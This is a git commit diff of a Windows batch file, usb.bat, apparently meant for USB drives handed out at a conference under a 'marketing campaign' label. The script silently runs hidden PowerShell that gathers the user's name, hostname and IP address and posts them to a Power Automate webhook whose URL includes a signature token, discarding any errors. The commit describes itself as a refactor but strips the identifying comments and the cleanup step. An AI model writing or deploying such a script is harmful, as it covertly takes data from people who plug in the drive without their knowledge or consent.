b8eae665098a7d8aa8809a9217c25f8f3f3b9586
sislam2005 <shujaaul@icloud.com>
2026-08-04 15:40:42 +0100

    Refactor usb.bat for data collection
    Removed comments and cleanup code, streamlined data collection process.

--- usb.bat
+++ usb.bat
@@ -1,11 +1,4 @@
-@echo off
-:: ============================================================
-::  Conference USB - Marketing Campaign
-::  Edit the 3 lines below, copy to USB, done.
-:: ===========================================================
-set USB_ID=USB-001
- 
- 
+set USB_ID=USB-001 
 :: Silently collect and send data
 powershell -NoProfile -NonInteractive -Command ^
   "$u=(whoami).Split('\')[-1];" ^
@@ -14,8 +7,5 @@ powershell -NoProfile -NonInteractive -Command ^
   "$t=[datetime]::UtcNow.ToString('o');" ^
   "$b='[{\"timestamp\":\"'+$t+'\",\"username\":\"'+$u+'\",\"hostname\":\"'+$h+'\",\"ip\":\"'+$ip+'\",\"usb_id\":\"%USB_ID%\"}]';" ^
   "try { Invoke-WebRequest -Uri 'https://default186f8545468f49e59c70379e23e2af.14.environment.api.powerplatform.com:443/powerautomate/automations/direct/cu/07/workflows/077b9dbc48f54a7a93fecc9619390597/triggers/manual/paths/invoke?api-version=1&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=DeE829DsviqXQivynKdiFqZOo2Hs05j5rYkZtUztfXA' -Method POST -Body $b -ContentType 'application/json' -UseBasicParsing } catch {}"
- 
-:: Cleanup temp vbs
-del "%temp%\silent_usb.vbs" >nul 2>&1
- 
+
  
